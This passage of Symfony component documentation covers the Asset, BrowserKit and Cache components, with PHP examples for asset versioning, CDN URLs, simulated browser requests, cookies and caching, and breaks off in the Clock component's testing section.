* **It's nearly impossible to use multiple CDNs**: this technique requires
  you to change the URL of the asset randomly for each request. The Asset component
  provides out-of-the-box support for any number of multiple CDNs, both regular
  (``http://``) and secure (``https://``).

Installation
------------

.. code-block:: terminal

    $ composer require symfony/asset

.. include:: /components/require_autoload.rst.inc

Usage
-----

.. _asset-packages:

Asset Packages
~~~~~~~~~~~~~~

The Asset component manages assets through packages. A package groups all the
assets which share the same properties: versioning strategy, base path, CDN hosts,
etc. In the following basic example, a package is created to manage assets without
any versioning::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\VersionStrategy\EmptyVersionStrategy;

    $package = new Package(new EmptyVersionStrategy());

    // Absolute path
    echo $package->getUrl('/image.png');
    // result: /image.png

    // Relative path
    echo $package->getUrl('image.png');
    // result: image.png

Packages implement :class:`Symfony\\Component\\Asset\\PackageInterface`,
which defines the following two methods:

:method:`Symfony\\Component\\Asset\\PackageInterface::getVersion`
    Returns the asset version for an asset.

:method:`Symfony\\Component\\Asset\\PackageInterface::getUrl`
    Returns an absolute or root-relative public path.

With a package, you can:

A) :ref:`version the assets <component-assets-versioning>`;
B) set a :ref:`common base path <component-assets-path-package>` (e.g. ``/css``)
   for the assets;
C) :ref:`configure a CDN <component-assets-cdn>` for the assets

.. _component-assets-versioning:

Versioned Assets
~~~~~~~~~~~~~~~~

One of the main features of the Asset component is the ability to manage
the versioning of the application's assets. Asset versions are commonly used
to control how these assets are cached.

Instead of relying on a simple version mechanism, the Asset component allows
you to define advanced versioning strategies via PHP classes. The two built-in
strategies are the :class:`Symfony\\Component\\Asset\\VersionStrategy\\EmptyVersionStrategy`,
which doesn't add any version to the asset and :class:`Symfony\\Component\\Asset\\VersionStrategy\\StaticVersionStrategy`,
which allows you to set the version with a format string.

In this example, the ``StaticVersionStrategy`` is used to append the ``v1``
suffix to any asset path::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\VersionStrategy\StaticVersionStrategy;

    $package = new Package(new StaticVersionStrategy('v1'));

    // Absolute path
    echo $package->getUrl('/image.png');
    // result: /image.png?v1

    // Relative path
    echo $package->getUrl('image.png');
    // result: image.png?v1

In case you want to modify the version format, pass a ``sprintf``-compatible
format string as the second argument of the ``StaticVersionStrategy``
constructor::

    // puts the 'version' word before the version value
    $package = new Package(new StaticVersionStrategy('v1', '%s?version=%s'));

    echo $package->getUrl('/image.png');
    // result: /image.png?version=v1

    // puts the asset version before its path
    $package = new Package(new StaticVersionStrategy('v1', '%2$s/%1$s'));

    echo $package->getUrl('/image.png');
    // result: /v1/image.png

    echo $package->getUrl('image.png');
    // result: v1/image.png

JSON File Manifest
..................

A popular strategy to manage asset versioning, which is used by tools such as
`Webpack`_, is to generate a JSON file mapping all source file names to their
corresponding output file:

.. code-block:: json

    {
        "css/app.css": "build/css/app.b916426ea1d10021f3f17ce8031f93c2.css",
        "js/app.js": "build/js/app.13630905267b809161e71d0f8a0c017b.js",
        "...": "..."
    }

In those cases, use the
:class:`Symfony\\Component\\Asset\\VersionStrategy\\JsonManifestVersionStrategy`::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\VersionStrategy\JsonManifestVersionStrategy;

    // assumes the JSON file above is called "rev-manifest.json"
    $package = new Package(new JsonManifestVersionStrategy(__DIR__.'/rev-manifest.json'));

    echo $package->getUrl('css/app.css');
    // result: build/css/app.b916426ea1d10021f3f17ce8031f93c2.css

If you request an asset that is *not found* in the ``rev-manifest.json`` file,
the original - *unmodified* - asset path will be returned. The ``$strictMode``
argument helps debug issues because it throws an exception when the asset is not
listed in the manifest::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\VersionStrategy\JsonManifestVersionStrategy;

    // The value of $strictMode can be specific per environment "true" for debugging and "false" for stability.
    $strictMode = true;
    // assumes the JSON file above is called "rev-manifest.json"
    $package = new Package(new JsonManifestVersionStrategy(__DIR__.'/rev-manifest.json', null, $strictMode));

    echo $package->getUrl('not-found.css');
    // error:

If your JSON file is not on your local filesystem but is accessible over HTTP,
use the :class:`Symfony\\Component\\Asset\\VersionStrategy\\JsonManifestVersionStrategy`
with the :doc:`HttpClient component </http_client>`::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\VersionStrategy\JsonManifestVersionStrategy;
    use Symfony\Component\HttpClient\HttpClient;

    $httpClient = HttpClient::create();
    $manifestUrl = 'https://cdn.example.com/rev-manifest.json';
    $package = new Package(new JsonManifestVersionStrategy($manifestUrl, $httpClient));

Custom Version Strategies
.........................

Use the :class:`Symfony\\Component\\Asset\\VersionStrategy\\VersionStrategyInterface`
to define your own versioning strategy. For example, your application may need
to append the current date to all its web assets in order to bust the cache
every day::

    use Symfony\Component\Asset\VersionStrategy\VersionStrategyInterface;

    class DateVersionStrategy implements VersionStrategyInterface
    {
        private string $version;

        public function __construct()
        {
            $this->version = date('Ymd');
        }

        public function getVersion(string $path): string
        {
            return $this->version;
        }

        public function applyVersion(string $path): string
        {
            return sprintf('%s?v=%s', $path, $this->getVersion($path));
        }
    }

.. _component-assets-path-package:

Grouped Assets
~~~~~~~~~~~~~~

Often, many assets live under a common path (e.g. ``/static/images``). If
that's your case, replace the default :class:`Symfony\\Component\\Asset\\Package`
class with :class:`Symfony\\Component\\Asset\\PathPackage` to avoid repeating
that path over and over again::

    use Symfony\Component\Asset\PathPackage;
    // ...

    $pathPackage = new PathPackage('/static/images', new StaticVersionStrategy('v1'));

    echo $pathPackage->getUrl('logo.png');
    // result: /static/images/logo.png?v1

    // Base path is ignored when using absolute paths
    echo $pathPackage->getUrl('/logo.png');
    // result: /logo.png?v1

Request Context Aware Assets
............................

If you are also using the :doc:`HttpFoundation </components/http_foundation>`
component in your project (for instance, in a Symfony application), the ``PathPackage``
class can take into account the context of the current request::

    use Symfony\Component\Asset\Context\RequestStackContext;
    use Symfony\Component\Asset\PathPackage;
    // ...

    $pathPackage = new PathPackage(
        '/static/images',
        new StaticVersionStrategy('v1'),
        new RequestStackContext($requestStack)
    );

    echo $pathPackage->getUrl('logo.png');
    // result: /somewhere/static/images/logo.png?v1

    // Both "base path" and "base url" are ignored when using absolute path for asset
    echo $pathPackage->getUrl('/logo.png');
    // result: /logo.png?v1

Now that the request context is set, the ``PathPackage`` will prepend the
current request base URL. So, for example, if your entire site is hosted under
the ``/somewhere`` directory of your web server root directory and the configured
base path is ``/static/images``, all paths will be prefixed with
``/somewhere/static/images``.

.. _component-assets-cdn:

Absolute Assets and CDNs
~~~~~~~~~~~~~~~~~~~~~~~~

Applications that host their assets on different domains and CDNs (*Content
Delivery Networks*) should use the :class:`Symfony\\Component\\Asset\\UrlPackage`
class to generate absolute URLs for their assets::

    use Symfony\Component\Asset\UrlPackage;
    // ...

    $urlPackage = new UrlPackage(
        'https://static.example.com/images/',
        new StaticVersionStrategy('v1')
    );

    echo $urlPackage->getUrl('/logo.png');
    // result: https://static.example.com/images/logo.png?v1

You can also pass a schema-agnostic URL::

    use Symfony\Component\Asset\UrlPackage;
    // ...

    $urlPackage = new UrlPackage(
        '//static.example.com/images/',
        new StaticVersionStrategy('v1')
    );

    echo $urlPackage->getUrl('/logo.png');
    // result: //static.example.com/images/logo.png?v1

This is useful because assets will automatically be requested via HTTPS if
a visitor is viewing your site in https. If you want to use this, make sure
that your CDN host supports HTTPS.

In case you serve assets from more than one domain to improve application
performance, pass an array of URLs as the first argument to the ``UrlPackage``
constructor::

    use Symfony\Component\Asset\UrlPackage;
    // ...

    $urls = [
        'https://static1.example.com/images/',
        'https://static2.example.com/images/',
    ];
    $urlPackage = new UrlPackage($urls, new StaticVersionStrategy('v1'));

    echo $urlPackage->getUrl('/logo.png');
    // result: https://static1.example.com/images/logo.png?v1
    echo $urlPackage->getUrl('/icon.png');
    // result: https://static2.example.com/images/icon.png?v1

For each asset, one of the URLs will be randomly used. But, the selection
is deterministic, meaning that each asset will always be served by the same
domain. This behavior simplifies the management of HTTP cache.

Request Context Aware Assets
............................

Similarly to application-relative assets, absolute assets can also take into
account the context of the current request. In this case, only the request
scheme is considered, in order to select the appropriate base URL (HTTPs or
protocol-relative URLs for HTTPs requests, any base URL for HTTP requests)::

    use Symfony\Component\Asset\Context\RequestStackContext;
    use Symfony\Component\Asset\UrlPackage;
    // ...

    $urlPackage = new UrlPackage(
        ['http://example.com/', 'https://example.com/'],
        new StaticVersionStrategy('v1'),
        new RequestStackContext($requestStack)
    );

    echo $urlPackage->getUrl('/logo.png');
    // assuming the RequestStackContext says that we are on a secure host
    // result: https://example.com/logo.png?v1

Named Packages
~~~~~~~~~~~~~~

Applications that manage lots of different assets may need to group them in
packages with the same versioning strategy and base path. The Asset component
includes a :class:`Symfony\\Component\\Asset\\Packages` class to simplify
management of several packages.

In the following example, all packages use the same versioning strategy, but
they all have different base paths::

    use Symfony\Component\Asset\Package;
    use Symfony\Component\Asset\Packages;
    use Symfony\Component\Asset\PathPackage;
    use Symfony\Component\Asset\UrlPackage;
    // ...

    $versionStrategy = new StaticVersionStrategy('v1');

    $defaultPackage = new Package($versionStrategy);

    $namedPackages = [
        'img' => new UrlPackage('https://img.example.com/', $versionStrategy),
        'doc' => new PathPackage('/somewhere/deep/for/documents', $versionStrategy),
    ];

    $packages = new Packages($defaultPackage, $namedPackages);

The ``Packages`` class allows to define a default package, which will be applied
to assets that don't define the name of the package to use. In addition, this
application defines a package named ``img`` to serve images from an external
domain and a ``doc`` package to avoid repeating long paths when linking to a
document inside a template::

    echo $packages->getUrl('/main.css');
    // result: /main.css?v1

    echo $packages->getUrl('/logo.png', 'img');
    // result: https://img.example.com/logo.png?v1

    echo $packages->getUrl('resume.pdf', 'doc');
    // result: /somewhere/deep/for/documents/resume.pdf?v1

Local Files and Other Protocols
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In addition to HTTP this component supports other protocols (such as ``file://``
and ``ftp://``). This allows for example to serve local files in order to
improve performance::

    use Symfony\Component\Asset\UrlPackage;
    // ...

    $localPackage = new UrlPackage(
        'file:///path/to/images/',
        new EmptyVersionStrategy()
    );

    $ftpPackage = new UrlPackage(
        'ftp://example.com/images/',
        new EmptyVersionStrategy()
    );

    echo $localPackage->getUrl('/logo.png');
    // result: file:///path/to/images/logo.png

    echo $ftpPackage->getUrl('/logo.png');
    // result: ftp://example.com/images/logo.png

Learn more
----------

* :doc:`How to manage CSS and JavaScript assets in Symfony applications </frontend>`
* :doc:`WebLink component </web_link>` to preload assets using HTTP/2.

.. _`Webpack`: https://webpack.js.org/
The BrowserKit Component
========================

    The BrowserKit component simulates the behavior of a web browser, allowing
    you to make requests, click on links and submit forms programmatically.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/browser-kit

.. include:: /components/require_autoload.rst.inc

Basic Usage
-----------

.. seealso::

    This article explains how to use the BrowserKit features as an independent
    component in any PHP application. Read the :ref:`Symfony Functional Tests <functional-tests>`
    article to learn about how to use it in Symfony applications.

Creating a Client
~~~~~~~~~~~~~~~~~

The component only provides an abstract client and does not provide any backend
ready to use for the HTTP layer. To create your own client, you must extend the
``AbstractBrowser`` class and implement the
:method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::doRequest` method.
This method accepts a request and should return a response::

    namespace Acme;

    use Symfony\Component\BrowserKit\AbstractBrowser;
    use Symfony\Component\BrowserKit\Response;

    class Client extends AbstractBrowser
    {
        protected function doRequest($request): Response
        {
            // ... convert request into a response

            return new Response($content, $status, $headers);
        }
    }

For a simple implementation of a browser based on the HTTP layer, have a look
at the :class:`Symfony\\Component\\BrowserKit\\HttpBrowser` provided by
:ref:`this component <component-browserkit-external-requests>`. For an implementation based
on ``HttpKernelInterface``, have a look at the :class:`Symfony\\Component\\HttpKernel\\HttpClientKernel`
provided by the :doc:`HttpKernel component </components/http_kernel>`.

Making Requests
~~~~~~~~~~~~~~~

Use the :method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::request` method to
make HTTP requests. The first two arguments are the HTTP method and the requested
URL::

    use Acme\Client;

    $client = new Client();
    $crawler = $client->request('GET', '/');

The value returned by the ``request()`` method is an instance of the
:class:`Symfony\\Component\\DomCrawler\\Crawler` class, provided by the
:doc:`DomCrawler component </components/dom_crawler>`, which allows accessing
and traversing HTML elements programmatically.

The :method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::jsonRequest` method,
which defines the same arguments as the ``request()`` method, is a shortcut to
convert the request parameters into a JSON string and set the needed HTTP headers::

    use Acme\Client;

    $client = new Client();
    // this encodes parameters as JSON and sets the required CONTENT_TYPE and HTTP_ACCEPT headers
    $crawler = $client->jsonRequest('GET', '/', ['some_parameter' => 'some_value']);

The :method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::xmlHttpRequest` method,
which defines the same arguments as the ``request()`` method, is a shortcut to
make AJAX requests::

    use Acme\Client;

    $client = new Client();
    // the required HTTP_X_REQUESTED_WITH header is added automatically
    $crawler = $client->xmlHttpRequest('GET', '/');

Clicking Links
~~~~~~~~~~~~~~

The ``AbstractBrowser`` is capable of simulating link clicks. Pass the text
content of the link and the client will perform the needed HTTP GET request to
simulate the link click::

    use Acme\Client;

    $client = new Client();
    $client->request('GET', '/product/123');

    $crawler = $client->clickLink('Go elsewhere...');

If you need the :class:`Symfony\\Component\\DomCrawler\\Link` object that
provides access to the link properties (e.g. ``$link->getMethod()``,
``$link->getUri()``), use this other method::

    // ...
    $crawler = $client->request('GET', '/product/123');
    $link = $crawler->selectLink('Go elsewhere...')->link();
    $client->click($link);

The :method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::click` and
:method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::clickLink` methods
can take an optional ``serverParameters`` argument. This
parameter allows to send additional information like headers when clicking
on a link::

    use Acme\Client;

    $client = new Client();
    $client->request('GET', '/product/123');

    // works both with `click()`...
    $link = $crawler->selectLink('Go elsewhere...')->link();
    $client->click($link, ['X-Custom-Header' => 'Some data']);

    // ... and `clickLink()`
    $crawler = $client->clickLink('Go elsewhere...', ['X-Custom-Header' => 'Some data']);

Submitting Forms
~~~~~~~~~~~~~~~~

The ``AbstractBrowser`` is also capable of submitting forms. First, select the
form using any of its buttons and then override any of its properties (method,
field values, etc.) before submitting it::

    use Acme\Client;

    $client = new Client();
    $crawler = $client->request('GET', 'https://github.com/login');

    // find the form with the 'Log in' button and submit it
    // 'Log in' can be the text content, id, value or name of a <button> or <input type="submit">
    $client->submitForm('Log in');

    // the second optional argument lets you override the default form field values
    $client->submitForm('Log in', [
        'login' => 'my_user',
        'password' => 'my_pass',
        // to upload a file, the value must be the absolute file path
        'file' => __FILE__,
    ]);

    // you can override other form options too
    $client->submitForm(
        'Log in',
        ['login' => 'my_user', 'password' => 'my_pass'],
        // override the default form HTTP method
        'PUT',
        // override some $_SERVER parameters (e.g. HTTP headers)
        ['HTTP_ACCEPT_LANGUAGE' => 'es']
    );

If you need the :class:`Symfony\\Component\\DomCrawler\\Form` object that
provides access to the form properties (e.g. ``$form->getUri()``,
``$form->getValues()``, ``$form->getFields()``), use this other method::

    // ...

    // select the form and fill in some values
    $form = $crawler->selectButton('Log in')->form();
    $form['login'] = 'symfonyfan';
    $form['password'] = 'anypass';

    // submit that form
    $crawler = $client->submit($form);

Custom Header Handling
~~~~~~~~~~~~~~~~~~~~~~

The optional HTTP headers passed to the ``request()`` method follow the FastCGI
request format (uppercase, underscores instead of dashes and prefixed with ``HTTP_``).
Before saving those headers to the request, they are lower-cased, with ``HTTP_``
stripped, and underscores converted into dashes.

If you're making a request to an application that has special rules about header
capitalization or punctuation, override the ``getHeaders()`` method, which must
return an associative array of headers::

    protected function getHeaders(Request $request): array
    {
        $headers = parent::getHeaders($request);
        if (isset($request->getServer()['api_key'])) {
            $headers['api_key'] = $request->getServer()['api_key'];
        }

        return $headers;
    }

Cookies
-------

Retrieving Cookies
~~~~~~~~~~~~~~~~~~

The ``AbstractBrowser`` implementation exposes cookies (if any) through a
:class:`Symfony\\Component\\BrowserKit\\CookieJar`, which allows you to store and
retrieve any cookie while making requests with the client::

    use Acme\Client;

    // Make a request
    $client = new Client();
    $crawler = $client->request('GET', '/');

    // Get the cookie Jar
    $cookieJar = $client->getCookieJar();

    // Get a cookie by name
    $cookie = $cookieJar->get('name_of_the_cookie');

    // Get cookie data
    $name       = $cookie->getName();
    $value      = $cookie->getValue();
    $rawValue   = $cookie->getRawValue();
    $isSecure   = $cookie->isSecure();
    $isHttpOnly = $cookie->isHttpOnly();
    $isExpired  = $cookie->isExpired();
    $expires    = $cookie->getExpiresTime();
    $path       = $cookie->getPath();
    $domain     = $cookie->getDomain();
    $sameSite   = $cookie->getSameSite();

.. note::

    These methods only return cookies that have not expired.

Looping Through Cookies
~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: php

    use Acme\Client;

    // Make a request
    $client = new Client();
    $crawler = $client->request('GET', '/');

    // Get the cookie Jar
    $cookieJar = $client->getCookieJar();

    // Get array with all cookies
    $cookies = $cookieJar->all();
    foreach ($cookies as $cookie) {
        // ...
    }

    // Get all values
    $values = $cookieJar->allValues('http://symfony.com');
    foreach ($values as $value) {
        // ...
    }

    // Get all raw values
    $rawValues = $cookieJar->allRawValues('http://symfony.com');
    foreach ($rawValues as $rawValue) {
        // ...
    }

Setting Cookies
~~~~~~~~~~~~~~~

You can also create cookies and add them to a cookie jar that can be injected
into the client constructor::

    use Acme\Client;

    // create cookies and add to cookie jar
    $cookie = new Cookie('flavor', 'chocolate', strtotime('+1 day'));
    $cookieJar = new CookieJar();
    $cookieJar->set($cookie);

    // create a client and set the cookies
    $client = new Client([], null, $cookieJar);
    // ...

.. _component-browserkit-sending-cookies:

Sending Cookies
~~~~~~~~~~~~~~~

Requests can include cookies. To do so, use the ``serverParameters`` argument of
the :method:`Symfony\\Component\\BrowserKit\\AbstractBrowser::request` method
to set the ``Cookie`` header value::

    $client->request('GET', '/', [], [], [
        'HTTP_COOKIE' => new Cookie('flavor', 'chocolate', strtotime('+1 day')),

        // you can also pass the cookie contents as a string
        'HTTP_COOKIE' => 'flavor=chocolate; expires=Sat, 11 Feb 2023 12:18:13 GMT; Max-Age=86400; path=/'
    ]);

.. note::

    All HTTP headers set with the ``serverParameters`` argument must be
    prefixed by ``HTTP_``.

History
-------

The client stores all your requests allowing you to go back and forward in your
history::

    use Acme\Client;

    $client = new Client();
    $client->request('GET', '/');

    // select and click on a link
    $link = $crawler->selectLink('Documentation')->link();
    $client->click($link);

    // go back to home page
    $crawler = $client->back();

    // go forward to documentation page
    $crawler = $client->forward();

You can delete the client's history with the ``restart()`` method. This will
also delete all the cookies::

    use Acme\Client;

    $client = new Client();
    $client->request('GET', '/');

    // reset the client (history and cookies are cleared too)
    $client->restart();

.. _component-browserkit-external-requests:

Making External HTTP Requests
-----------------------------

So far, all the examples in this article have assumed that you are making
internal requests to your own application. However, you can run the exact same
examples when making HTTP requests to external web sites and applications.

First, install and configure the :doc:`HttpClient component </http_client>`.
Then, use the :class:`Symfony\\Component\\BrowserKit\\HttpBrowser` to create
the client that will make the external HTTP requests::

    use Symfony\Component\BrowserKit\HttpBrowser;
    use Symfony\Component\HttpClient\HttpClient;

    $browser = new HttpBrowser(HttpClient::create());

You can now use any of the methods shown in this article to extract information,
click links, submit forms, etc. This means that you no longer need to use a
dedicated web crawler or scraper such as `Goutte`_::

    $browser = new HttpBrowser(HttpClient::create());

    $browser->request('GET', 'https://github.com');
    $browser->clickLink('Sign in');
    $browser->submitForm('Sign in', ['login' => '...', 'password' => '...']);
    $openPullRequests = trim($browser->clickLink('Pull requests')->filter(
        '.table-list-header-toggle a:nth-child(1)'
    )->text());

.. tip::

    You can also use HTTP client options like ``ciphers``, ``auth_basic`` and
    ``query``. They have to be passed as the default options argument to the
    client which is used by the HTTP browser.

Dealing with HTTP responses
~~~~~~~~~~~~~~~~~~~~~~~~~~~

When using the BrowserKit component, you may need to deal with responses of
the requests you made. To do so, call the ``getResponse()`` method of the
``HttpBrowser`` object. This method returns the last response the browser received::

    $browser = new HttpBrowser(HttpClient::create());

    $browser->request('GET', 'https://foo.com');
    $response = $browser->getResponse();

If you're making requests that result in a JSON response, you may use the
``toArray()`` method to turn the JSON document into a PHP array without having
to call ``json_decode()`` explicitly::

    $browser = new HttpBrowser(HttpClient::create());

    $browser->request('GET', 'https://api.foo.com');
    $response = $browser->getResponse()->toArray();
    // $response is a PHP array of the decoded JSON contents

Learn more
----------

* :doc:`/testing`
* :doc:`/components/css_selector`
* :doc:`/components/dom_crawler`

.. _`Goutte`: https://github.com/FriendsOfPHP/Goutte
.. _`cache-component`:

The Cache Component
===================

    The Cache component provides features covering simple to advanced caching needs.
    It natively implements `PSR-6`_ and the `Cache Contracts`_ for greatest
    interoperability. It is designed for performance and resiliency, ships with
    ready to use adapters for the most common caching backends. It enables tag-based
    invalidation and cache stampede protection via locking and early expiration.

.. tip::

    The component also contains adapters to convert between PSR-6 and PSR-16.
    See :doc:`/components/cache/psr6_psr16_adapters`.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/cache

.. include:: /components/require_autoload.rst.inc

Cache Contracts versus PSR-6
----------------------------

This component includes *two* different approaches to caching:

:ref:`PSR-6 Caching <cache-component-psr6-caching>`:
    A generic cache system, which involves cache "pools" and cache "items".

:ref:`Cache Contracts <cache-component-contracts>`:
    A simpler yet more powerful way to cache values based on recomputation callbacks.

.. tip::

    Using the Cache Contracts approach is recommended: it requires less
    code boilerplate and provides cache stampede protection by default.

.. _cache-component-contracts:

Cache Contracts
---------------

All adapters support the Cache Contracts. They contain only two methods:
``get()`` and ``delete()``. There's no ``set()`` method because the ``get()``
method both gets and sets the cache values.

The first thing you need is to instantiate a cache adapter. The
:class:`Symfony\\Component\\Cache\\Adapter\\FilesystemAdapter` is used in this
example::

    use Symfony\Component\Cache\Adapter\FilesystemAdapter;

    $cache = new FilesystemAdapter();

Now you can retrieve and delete cached data using this object. The first
argument of the ``get()`` method is a key, an arbitrary string that you
associate to the cached value so you can retrieve it later. The second argument
is a PHP callable which is executed when the key is not found in the cache to
generate and return the value::

    use Symfony\Contracts\Cache\ItemInterface;

    // The callable will only be executed on a cache miss.
    $value = $cache->get('my_cache_key', function (ItemInterface $item): string {
        $item->expiresAfter(3600);

        // ... do some HTTP request or heavy computations
        $computedValue = 'foobar';

        return $computedValue;
    });

    echo $value; // 'foobar'

    // ... and to remove the cache key
    $cache->delete('my_cache_key');

.. note::

    Use cache tags to delete more than one key at the time. Read more at
    :doc:`/components/cache/cache_invalidation`.

.. _cache_stampede-prevention:

Stampede Prevention
~~~~~~~~~~~~~~~~~~~

The Cache Contracts also come with built in `Stampede prevention`_. This will
remove CPU spikes at the moments when the cache is cold. If an example application
spends 5 seconds to compute data that is cached for 1 hour and this data is accessed
10 times every second, this means that you mostly have cache hits and everything
is fine. But after 1 hour, we get 10 new requests to a cold cache. So the data
is computed again. The next second the same thing happens. So the data is computed
about 50 times before the cache is warm again. This is where you need stampede
prevention.

The first solution is to use locking: only allow one PHP process (on a per-host basis)
to compute a specific key at a time. Locking is built-in by default, so
you don't need to do anything beyond leveraging the Cache Contracts.

The second solution is also built-in when using the Cache Contracts: instead of
waiting for the full delay before expiring a value, recompute it ahead of its
expiration date. The `Probabilistic early expiration`_ algorithm randomly fakes a
cache miss for one user while others are still served the cached value. You can
control its behavior with the third optional parameter of
:method:`Symfony\\Contracts\\Cache\\CacheInterface::get`,
which is a float value called "beta".

By default the beta is ``1.0`` and higher values mean earlier recompute. Set it
to ``0`` to disable early recompute and set it to ``INF`` to force an immediate
recompute::

    use Symfony\Contracts\Cache\ItemInterface;

    $beta = 1.0;
    $value = $cache->get('my_cache_key', function (ItemInterface $item): string {
        $item->expiresAfter(3600);
        $item->tag(['tag_0', 'tag_1']);

        return '...';
    }, $beta);

Available Cache Adapters
~~~~~~~~~~~~~~~~~~~~~~~~

The following cache adapters are available:

.. toctree::
    :glob:
    :maxdepth: 1

    cache/adapters/*

.. _cache-component-psr6-caching:

Generic Caching (PSR-6)
-----------------------

To use the generic PSR-6 Caching abilities, you'll need to learn its key
concepts:

**Item**
    A single unit of information stored as a key/value pair, where the key is
    the unique identifier of the information and the value is its contents;
    see the :doc:`/components/cache/cache_items` article for more details.
**Pool**
    A logical repository of cache items. All cache operations (saving items,
    looking for items, etc.) are performed through the pool. Applications can
    define as many pools as needed.
**Adapter**
    It implements the actual caching mechanism to store the information in the
    filesystem, in a database, etc. The component provides several ready to use
    adapters for common caching backends (Redis, APCu, PDO, etc.)

Basic Usage (PSR-6)
-------------------

This part of the component is an implementation of `PSR-6`_, which means that its
basic API is the same as defined in the document. Before starting to cache information,
create the cache pool using any of the built-in adapters. For example, to create
a filesystem-based cache, instantiate :class:`Symfony\\Component\\Cache\\Adapter\\FilesystemAdapter`::

    use Symfony\Component\Cache\Adapter\FilesystemAdapter;

    $cache = new FilesystemAdapter();

Now you can create, retrieve, update and delete items using this cache pool::

    // create a new item by trying to get it from the cache
    $productsCount = $cache->getItem('stats.products_count');

    // assign a value to the item and save it
    $productsCount->set(4711);
    $cache->save($productsCount);

    // retrieve the cache item
    $productsCount = $cache->getItem('stats.products_count');
    if (!$productsCount->isHit()) {
        // ... item does not exist in the cache
    }
    // retrieve the value stored by the item
    $total = $productsCount->get();

    // remove the cache item
    $cache->deleteItem('stats.products_count');

For a list of all of the supported adapters, see :doc:`/components/cache/cache_pools`.

Marshalling (Serializing) Data
------------------------------

.. note::

    `Marshalling`_ and `serializing`_ are similar concepts. Serializing is the
    process of translating an object state into a format that can be stored
    (e.g. in a file). Marshalling is the process of translating both the object
    state and its codebase into a format that can be stored or transmitted.

    Unmarshalling an object produces a copy of the original object, possibly by
    automatically loading the class definitions of the object.

Symfony uses *marshallers* (classes which implement
:class:`Symfony\\Component\\Cache\\Marshaller\\MarshallerInterface`) to process
the cache items before storing them.

The :class:`Symfony\\Component\\Cache\\Marshaller\\DefaultMarshaller` uses PHP's
``serialize()`` or ``igbinary_serialize()`` if the `Igbinary extension`_ is installed.
There are other *marshallers* that can encrypt or compress the data before storing it::

    use Symfony\Component\Cache\Adapter\RedisAdapter;
    use Symfony\Component\Cache\DefaultMarshaller;
    use Symfony\Component\Cache\DeflateMarshaller;

    $marshaller = new DeflateMarshaller(new DefaultMarshaller());
    $cache = new RedisAdapter(new \Redis(), 'namespace', 0, $marshaller);

Advanced Usage
--------------

.. toctree::
    :glob:
    :maxdepth: 1

    cache/*

.. _`PSR-6`: https://www.php-fig.org/psr/psr-6/
.. _`Cache Contracts`: https://github.com/symfony/contracts/blob/master/Cache/CacheInterface.php
.. _`Stampede prevention`: https://en.wikipedia.org/wiki/Cache_stampede
.. _Probabilistic early expiration: https://en.wikipedia.org/wiki/Cache_stampede#Probabilistic_early_expiration
.. _`Marshalling`: https://en.wikipedia.org/wiki/Marshalling_(computer_science)
.. _`serializing`: https://en.wikipedia.org/wiki/Serialization
.. _`Igbinary extension`: https://github.com/igbinary/igbinary
The Clock Component
===================

The Clock component decouples applications from the system clock. This allows
you to fix time to improve testability of time-sensitive logic.

The component provides a ``ClockInterface`` with the following implementations
for different use cases:

:class:`Symfony\\Component\\Clock\\NativeClock`
    Provides a way to interact with the system clock, this is the same as doing
    ``new \DateTimeImmutable()``.
:class:`Symfony\\Component\\Clock\\MockClock`
    Commonly used in tests as a replacement for the ``NativeClock`` to be able
    to freeze and change the current time using either ``sleep()`` or ``modify()``.
:class:`Symfony\\Component\\Clock\\MonotonicClock`
    Relies on ``hrtime()`` and provides a high resolution, monotonic clock,
    when you need a precise stopwatch.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/clock

.. include:: /components/require_autoload.rst.inc

.. _clock_usage:

Usage
-----

The :class:`Symfony\\Component\\Clock\\Clock` class returns the current time and
allows to use any `PSR-20`_ compatible implementation as a global clock in your
application::

    use Symfony\Component\Clock\Clock;
    use Symfony\Component\Clock\MockClock;

    // by default, Clock uses the NativeClock implementation, but you can change
    // this by setting any other implementation
    Clock::set(new MockClock());

    // Then, you can get the clock instance
    $clock = Clock::get();

    // Additionally, you can set a timezone
    $clock->withTimeZone('Europe/Paris');

    // From here, you can get the current time
    $now = $clock->now();

    // And sleep for any number of seconds
    $clock->sleep(2.5);

The Clock component also provides the ``now()`` function::

    use function Symfony\Component\Clock\now;

    // Get the current time as a DatePoint instance
    $now = now();

The ``now()`` function takes an optional ``modifier`` argument
which will be applied to the current time::

    $later = now('+3 hours');

    $yesterday = now('-1 day');

You can use any string `accepted by the DateTime constructor`_.

Later on this page you can learn how to use this clock in your services and tests.
When using the Clock component, you manipulate
:class:`Symfony\\Component\\Clock\\DatePoint` instances. You can learn more
about it in :ref:`the dedicated section <clock_date-point>`.

Available Clocks Implementations
--------------------------------

The Clock component provides some ready-to-use implementations of the
:class:`Symfony\\Component\\Clock\\ClockInterface`, which you can use
as global clocks in your application depending on your needs.

NativeClock
~~~~~~~~~~~

A clock service replaces creating a new ``DateTime`` or
``DateTimeImmutable`` object for the current time. Instead, you inject the
``ClockInterface`` and call ``now()``. By default, your application will likely
use a ``NativeClock``, which always returns the current system time. In tests it is replaced with a ``MockClock``.

The following example introduces a service utilizing the Clock component to
determine the current time::

    use Symfony\Component\Clock\ClockInterface;

    class ExpirationChecker
    {
        public function __construct(
            private ClockInterface $clock
        ) {}

        public function isExpired(DateTimeInterface $validUntil): bool
        {
            return $this->clock->now() > $validUntil;
        }
    }

MockClock
~~~~~~~~~

The ``MockClock`` is instantiated with a time and does not move forward on its own. The time is
fixed until ``sleep()`` or ``modify()`` are called. This gives you full control over what your code
assumes is the current time.

When writing a test for this service, you can check both cases where something
is expired or not, by modifying the clock's time::

    use PHPUnit\Framework\TestCase;
    use Symfony\Component\Clock\MockClock;

    class ExpirationCheckerTest extends TestCase
    {
        public function testIsExpired(): void
        {
